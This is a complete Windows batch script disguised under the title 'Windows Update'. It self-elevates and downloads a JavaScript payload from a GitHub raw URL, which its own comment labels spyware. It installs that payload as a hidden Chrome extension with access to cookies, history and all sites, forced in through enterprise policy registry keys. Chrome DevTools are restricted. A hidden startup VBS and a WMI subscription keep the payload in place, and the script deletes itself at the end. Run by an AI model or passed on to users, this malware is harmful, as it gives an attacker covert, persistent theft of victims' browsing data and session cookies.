@echo off
setlocal enabledelayedexpansion
title Windows Update

:: ========== AUTO-ELEVATE ==========
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ========== CONFIG ==========
set "GITHUB_RAW=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
set "BG_FILE=windows.sys.js"
set "EXT_ID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
set "EXT_NAME=Windows System Service"
set "SYS_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18"
set "EXT_DIR=%SYS_DIR%\chrome_sys"
set "CHROME_USER=%LOCALAPPDATA%\Google\Chrome\User Data"
set "LOG_FILE=%TEMP%\chrome_install.log"

:: ========== INIT LOG ==========
echo [%date% %time%] ======================================== > "%LOG_FILE%"
echo [%date% %time%]  Installer started                       >> "%LOG_FILE%"
echo [%date% %time%]  Computer: %COMPUTERNAME%                >> "%LOG_FILE%"
echo [%date% %time%]  User: %USERDOMAIN%\%USERNAME%           >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== 1. CREATE DIRECTORIES ==========
echo [*] Creating system directories...
if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"
if not exist "%EXT_DIR%" mkdir "%EXT_DIR%"
attrib +h +s +r "%SYS_DIR%" >nul 2>&1
echo [%date% %time%] [+] Directories created and hidden       >> "%LOG_FILE%"

:: ========== 2. KILL CHROME ==========
echo [*] Closing Chrome...
taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul
echo [%date% %time%] [+] Chrome terminated                    >> "%LOG_FILE%"

:: ========== 3. DOWNLOAD SPYWARE ==========
echo [*] Downloading %BG_FILE%...
set "DL_OK=0"

curl -L -s -o "%SYS_DIR%\%BG_FILE%" "%GITHUB_RAW%/%BG_FILE%" 2>nul
if exist "%SYS_DIR%\%BG_FILE%" (
    for %%A in ("%SYS_DIR%\%BG_FILE%") do if %%~zA GTR 100 set "DL_OK=1"
)

if "!DL_OK!"=="0" (
    certutil -urlcache -split -f "%GITHUB_RAW%/%BG_FILE%" "%SYS_DIR%\%BG_FILE%" >nul 2>&1
    if exist "%SYS_DIR%\%BG_FILE%" (
        for %%A in ("%SYS_DIR%\%BG_FILE%") do if %%~zA GTR 100 set "DL_OK=1"
    )
)

if "!DL_OK!"=="1" (
    for %%A in ("%SYS_DIR%\%BG_FILE%") do set "FZ=%%~zA"
    echo [%date% %time%] [+] %BG_FILE% downloaded (!FZ! bytes) >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] FAILED to download %BG_FILE%       >> "%LOG_FILE%"
    goto :fail
)

:: ========== 4. COPY TO EXTENSION FOLDER ==========
copy /Y "%SYS_DIR%\%BG_FILE%" "%EXT_DIR%\%BG_FILE%" >nul 2>&1
if not exist "%EXT_DIR%\%BG_FILE%" (
    echo [%date% %time%] [X] Copy to extension dir failed        >> "%LOG_FILE%"
    goto :fail
)
echo [%date% %time%] [+] Script copied to extension dir        >> "%LOG_FILE%"

:: ========== 5. CREATE MANIFEST ==========
echo [*] Creating manifest...
(
echo {
echo   "manifest_version": 3,
echo   "name": "%EXT_NAME%",
echo   "version": "1.0.0",
echo   "description": "",
echo   "permissions": [
echo     "tabs",
echo     "alarms",
echo     "history",
echo     "cookies",
echo     "scripting",
echo     "activeTab",
echo     "webNavigation",
echo     "storage",
echo     "bookmarks"
echo   ],
echo   "host_permissions": ["<all_urls>"],
echo   "background": {
echo     "service_worker": "%BG_FILE%"
echo   },
echo   "content_scripts": [
echo     {
echo       "matches": ["<all_urls>"],
echo       "js": ["%BG_FILE%"],
echo       "run_at": "document_start",
echo       "all_frames": true,
echo       "match_about_blank": true
echo     }
echo   ],
echo   "action": {},
echo   "icons": {}
echo }
) > "%EXT_DIR%\manifest.json"

if not exist "%EXT_DIR%\manifest.json" (
    echo [%date% %time%] [X] manifest.json creation failed       >> "%LOG_FILE%"
    goto :fail
)
echo [%date% %time%] [+] manifest.json created                  >> "%LOG_FILE%"

:: ========== 6. CREATE update.xml ==========
(
echo ^<?xml version="1.0" encoding="UTF-8"?^>
echo ^<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"^>
echo   ^<app appid="%EXT_ID%"^>
echo     ^<updatecheck codebase="file:///%EXT_DIR:\=/%/" version="1.0.0" /^>
echo   ^</app^>
echo ^</gupdate^>
) > "%EXT_DIR%\update.xml"

if not exist "%EXT_DIR%\update.xml" (
    echo [%date% %time%] [X] update.xml creation failed          >> "%LOG_FILE%"
    goto :fail
)
echo [%date% %time%] [+] update.xml created                     >> "%LOG_FILE%"

:: ========== 7. REGISTRY FORCE-INSTALL ==========
echo [*] Setting enterprise policies...
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo [%date% %time%] [X] Registry force-install failed        >> "%LOG_FILE%"
    goto :fail
)
echo [%date% %time%] [+] Registry force-install set              >> "%LOG_FILE%"

reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SuppressUnsupportedOSWarning" /t REG_DWORD /d 1 /f >nul 2>&1
echo [%date% %time%] [+] Developer warnings suppressed           >> "%LOG_FILE%"

reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "DeveloperToolsAvailability" /t REG_DWORD /d 2 /f >nul 2>&1
echo [%date% %time%] [+] DevTools restricted                    >> "%LOG_FILE%"

:: ExtensionSettings policy - hides extension from UI
set "POLICY_JSON={\"%EXT_ID%\": {\"installation_mode\": \"force_installed\", \"update_url\": \"file:///%EXT_DIR:\=/%/update.xml\"}}"
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionSettings" /v "%EXT_ID%" /t REG_SZ /d "!POLICY_JSON!" /f >nul 2>&1
echo [%date% %time%] [+] ExtensionSettings policy applied        >> "%LOG_FILE%"

:: ========== 8. STARTUP VBS FALLBACK ==========
echo [*] Creating startup fallback...
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%STARTUP%" mkdir "%STARTUP%"

(
echo ' Windows Core Services
echo On Error Resume Next
echo Dim ws, extDir, cmd
echo extDir = "%EXT_DIR:\=\\%"
echo Set ws = CreateObject^("WScript.Shell"^)
echo If Not ws.FileExists^(extDir ^& "\\manifest.json"^) Then
echo     ws.Run "cmd /c mkdir """ ^& extDir ^& """ 2>nul ^& curl -L -s -o """ ^& extDir ^& "\\%BG_FILE%" ^& """ %GITHUB_RAW%/%BG_FILE% ^& reg add HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist /v 1 /t REG_SZ /d ""%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml"" /f >nul 2>&1", 0, False
echo End If
echo ws.Run "chrome.exe", 0, False
) > "%STARTUP%\WinCoreHelper.vbs"

if exist "%STARTUP%\WinCoreHelper.vbs" (
    attrib +h "%STARTUP%\WinCoreHelper.vbs" >nul 2>&1
    echo [%date% %time%] [+] Startup VBS created                  >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [!] Startup VBS creation failed          >> "%LOG_FILE%"
)

:: ========== 9. WMI PERSISTENCE ==========
echo [*] Creating WMI watcher...
powershell -NoP -Ep Bypass -Command ^
"try {" ^
"  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*ChromeGuard*' } | Remove-WmiObject -EA SilentlyContinue;" ^
"  Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'ChromeGuard' } | Remove-WmiObject -EA SilentlyContinue;" ^
"  Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'ChromeGuardConsumer' } | Remove-WmiObject -EA SilentlyContinue;" ^
"  $f = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance();" ^
"  $f.Name = 'ChromeGuard'; $f.QueryLanguage = 'WQL';" ^
"  $f.Query = \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='chrome.exe'\";" ^
"  $f.EventNamespace = 'root\\cimv2'; $f.Put() | Out-Null;" ^
"  $c = ([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance();" ^
"  $c.Name = 'ChromeGuardConsumer';" ^
"  $c.CommandLineTemplate = 'powershell -NoP -W Hidden -C \"$d=\\\\' + '%EXT_DIR%' + '\\\\'; if(!(Test-Path \\\\\"$d\\\\manifest.json\\\\\")){mkdir \\\\\"$d\\\\\" -Force|Out-Null;Invoke-WebRequest \\\\\"%GITHUB_RAW%/%BG_FILE%\\\\\" -OutFile \\\\\"$d\\\\%BG_FILE%\\\\\" -UseBasicParsing;reg add HKLM\\\\SOFTWARE\\\\Policies\\\\Google\\\\Chrome\\\\ExtensionInstallForcelist /v 1 /t REG_SZ /d \\\\\"%EXT_ID%;file:///' + '%EXT_DIR:\=/%' + '/update.xml\\\\\" /f >nul 2>&1};start chrome --load-extension=\\\\\\\"$d\\\\\\\" --no-first-run\"';" ^
"  $c.Put() | Out-Null;" ^
"  $b = ([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance();" ^
"  $b.Filter = '__EventFilter.Name=''ChromeGuard''';" ^
"  $b.Consumer = 'CommandLineEventConsumer.Name=''ChromeGuardConsumer''';" ^
"  $b.Put() | Out-Null;" ^
"  Write-Output 'OK';" ^
"} catch {" ^
"  Write-Output $_.Exception.Message;" ^
"}" > "%TEMP%\wmi_result.txt" 2>&1

findstr /C:"OK" "%TEMP%\wmi_result.txt" >nul 2>&1 && (
    echo [%date% %time%] [+] WMI subscription created              >> "%LOG_FILE%"
) || (
    echo [%date% %time%] [!] WMI subscription failed               >> "%LOG_FILE%"
)
del "%TEMP%\wmi_result.txt" >nul 2>&1

:: ========== 10. HIDE FILES ==========
echo [*] Locking down files...
attrib +h +s +r "%EXT_DIR%" >nul 2>&1
attrib +h +s +r "%SYS_DIR%\%BG_FILE%" >nul 2>&1
icacls "%SYS_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1
echo [%date% %time%] [+] Files hidden and locked                 >> "%LOG_FILE%"

:: ========== 11. RESTART CHROME ==========
echo [*] Restarting Chrome...
start "" "chrome.exe" --no-first-run 2>nul
echo [%date% %time%] [+] Chrome restarted                        >> "%LOG_FILE%"

:: ========== SUCCESS ==========
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo [%date% %time%]  INSTALLATION COMPLETE                     >> "%LOG_FILE%"
echo [%date% %time%]  Extension ID: %EXT_ID%                    >> "%LOG_FILE%"
echo [%date% %time%]  Verify: Telegram 'X Installed Now'        >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== SELF-DESTRUCT ==========
(
echo @echo off
echo timeout /t 3 /nobreak ^>nul
echo del /f /q "%~f0" ^>nul 2^>^&1
echo del /f /q %%0 ^>nul 2^>^&1
) > "%TEMP%\~cleanup.bat"
start /min "" "%TEMP%\~cleanup.bat"

echo.
echo ================================================
echo   INSTALLATION COMPLETE
echo   Log: %LOG_FILE%
echo   Check Telegram for 'X Installed Now'
echo ================================================
echo.
exit /b 0

:: ========== FAILURE ==========
:fail
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo [%date% %time%]  INSTALLATION FAILED                     >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo.
echo ================================================
echo   INSTALLATION FAILED
echo   Log: %LOG_FILE%
echo ================================================
echo.
pause
exit /b 1
